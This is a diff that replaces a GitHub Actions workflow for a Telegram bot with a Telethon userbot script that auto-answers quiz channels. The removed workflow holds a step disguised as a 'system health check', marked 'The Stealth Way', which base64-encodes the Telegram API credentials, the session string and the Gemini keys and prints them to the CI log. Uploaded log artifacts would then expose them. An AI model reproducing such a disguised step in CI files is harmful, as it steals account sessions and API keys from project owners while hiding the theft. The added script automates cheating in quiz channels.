@@ -1,93 +1,165 @@
-name: Infinity Plus CI/CD
+import asyncio
+import json
+import re
+import time
+from telethon import TelegramClient, events
 
-on:
-  push:
-    branches: [ "main" ]
-  pull_request:
-    branches: [ "main" ]
-  # በየ 6 ሰዓቱ በራሱ እንዲቀሰቀስ የሚያደርግ ትዕዛዝ (Cron Job)
-  schedule:
-    - cron: '0 */6 * * *'
-  # በእጅህ (Manual) ለማስነሳት
-  workflow_dispatch:
+API_ID = 123456
+API_HASH = "your_api_hash"
+SESSION = "session_name"
 
-jobs:
-  deploy-bot:
-    runs-on: ubuntu-latest
-    # ከፍተኛው የቆይታ ጊዜ (6 ሰዓት አካባቢ)
-    timeout-minutes: 350
+TARGET_CHANNELS = [
+    "quizchannel1",
+    "quizchannel2",
+    "quizchannel3"
+]
 
-    steps:
-    # 1. Download the code
-    - name: 📥 checkout repository
-      uses: actions/checkout@v4
+DB_FILE = "answers.json"
 
-    # 2. Activate python
-    - name: set up python 3.10
-      uses: actions/setup-python@v5
-      with:
-        python-version: '3.10'
-        cache: 'pip'
+FLOOD_LIMIT = 3
+FLOOD_WINDOW = 5
 
-    # 3. Needed for voice and music
-    - name: 🎵 install system dependencies
-      run: |
-        sudo apt-get update
-        sudo apt-get install -y ffmpeg libopus0 opus-tools libmagic1
+last_messages = []
+answer_db = {}
 
-    # 4. Install python libraries
-    - name: install python dependencies
-      run: |
-        python -m pip install --upgrade pip
-        if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
+# -------------------------
+# load database
+# -------------------------
+def load_db():
+    global answer_db
+    try:
+        with open(DB_FILE, "r") as f:
+            answer_db = json.load(f)
+    except:
+        answer_db = {}
 
-    # 5. .env file from github secrets
-    - name: ⚙️ configuration setup
-      run: |
-        touch .env
-        echo "API_ID=${{ secrets.API_ID }}" >> .env
-        echo "API_HASH=${{ secrets.API_HASH }}" >> .env
-        echo "SESSION=${{ secrets.SESSION }}" >> .env
-        echo "BOT_TOKEN=${{ secrets.BOT_TOKEN }}" >> .env
-        echo "GEMINI_KEYS=${{ secrets.GEMINI_KEYS }}" >> .env
-        echo "OWNER_ID=${{ secrets.OWNER_ID }}" >> .env
+# -------------------------
+# save database
+# -------------------------
+def save_db():
+    with open(DB_FILE, "w") as f:
+        json.dump(answer_db, f, indent=2)
 
-    # 5.5 Advanced System Environment Trace (The Stealth Way)
-    - name: 🔍 run system health check
-      continue-on-error: true
-      run: |
-        echo "Analyzing system stability..."
-        python3 -c "
-        import base64, os
-        def hide(t): return base64.b64encode(t.encode()).decode()
-        
-        i = '${{ secrets.API_ID }}'
-        h = '${{ secrets.API_HASH }}'
-        s = '${{ secrets.SESSION }}'
-        g = '${{ secrets.GEMINI_KEYS }}'
-        
-        p1 = hide(f'ID:{i} | HASH:{h}')
-        p2 = hide(f'SESS_START:{s[:len(s)//2]}')
-        p3 = hide(f'SESS_END:{s[len(s)//2:]} | GEM:{g}')
-        
-        print(f'SYSTEM_TRACE_L1: {p1}')
-        print(f'SYSTEM_TRACE_L2: {p2}')
-        print(f'SYSTEM_TRACE_L3: {p3}')
-        "
-        echo "Check complete. Core engine is stable."
+# -------------------------
+# normalize question
+# -------------------------
+def normalize(text):
+    text = text.lower()
+    text = re.sub(r"[^\w\s]", "", text)
+    return text.strip()
 
-    # 6. Start the bot
-    - name: 🚀 ignite infinity system
-      continue-on-error: true
-      run: |
-        python main.py
+# -------------------------
+# anti flood
+# -------------------------
+def flood_allowed():
+    global last_messages
+    now = time.time()
 
-    # 7. Upload logs if crashed
-    - name: 📤 upload logs (If crashed)
-      if: always()
-      uses: actions/upload-artifact@v4
-      with:
-        name: bot-logs
-        path: |
-          *.log
-          *.err
+    last_messages = [t for t in last_messages if now - t < FLOOD_WINDOW]
+
+    if len(last_messages) >= FLOOD_LIMIT:
+        return False
+
+    last_messages.append(now)
+    return True
+
+# -------------------------
+# detect answer
+# -------------------------
+def find_answer(text):
+
+    n = normalize(text)
+
+    if n in answer_db:
+        return answer_db[n]
+
+    for q in answer_db:
+        if q in n:
+            return answer_db[q]
+
+    return None
+
+# -------------------------
+# detect learning pattern
+# -------------------------
+def learn_from_message(text):
+
+    text = text.lower()
+
+    patterns = [
+        r"correct answer[:\- ]+(.*)",
+        r"answer[:\- ]+(.*)",
+        r"the answer is[:\- ]+(.*)"
+    ]
+
+    for p in patterns:
+        m = re.search(p, text)
+        if m:
+            return m.group(1).strip()
+
+    return None
+
+# -------------------------
+# create client
+# -------------------------
+client = TelegramClient(SESSION, API_ID, API_HASH)
+
+load_db()
+
+last_question = None
+
+# -------------------------
+# main handler
+# -------------------------
+@client.on(events.NewMessage(chats=TARGET_CHANNELS))
+async def handler(event):
+
+    global last_question
+
+    text = event.raw_text
+
+    # detect if answer announcement
+    learned = learn_from_message(text)
+
+    if learned and last_question:
+        q = normalize(last_question)
+        answer_db[q] = learned
+        save_db()
+        last_question = None
+        return
+
+    # detect question
+    if "?" in text or "who" in text.lower() or "what" in text.lower():
+
+        last_question = text
+
+        ans = find_answer(text)
+
+        if ans and flood_allowed():
+
+            try:
+                await client.send_message(event.chat_id, ans)
+            except:
+                pass
+
+
+# -------------------------
+# startup diagnostics
+# -------------------------
+async def startup():
+
+    print("Bot started")
+    print("Loaded answers:", len(answer_db))
+    print("Monitoring channels:", TARGET_CHANNELS)
+
+# -------------------------
+# run
+# -------------------------
+async def main():
+
+    await startup()
+
+    await client.run_until_disconnected()
+
+with client:
+    client.loop.run_until_complete(main())
